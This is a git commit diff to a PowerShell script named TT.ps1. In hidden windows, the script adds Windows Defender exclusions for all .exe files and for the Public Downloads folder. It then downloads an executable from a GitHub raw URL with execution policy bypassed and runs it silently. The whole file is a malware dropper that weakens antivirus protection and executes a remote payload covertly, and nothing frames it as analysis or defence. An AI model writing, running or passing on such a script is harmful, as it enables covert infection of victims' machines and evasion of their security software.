acf9905e282d2e90eb629a03dfcbe2cf7a1ea02c
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-17 14:29:37 +0200

    Update TT.ps1

--- TT.ps1
+++ TT.ps1
@@ -1,4 +1,4 @@
 powershell -WindowStyle Hidden Command Add-MpPreference -ExclusionExtension ".exe"
-powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath "C:\Program Files"
+powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\"
 powershell -WindowStyle Hidden -ep bypass iwr -uri https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe
 powershell.exe -w hidden C:\Users\Public\Downloads\Test.exe
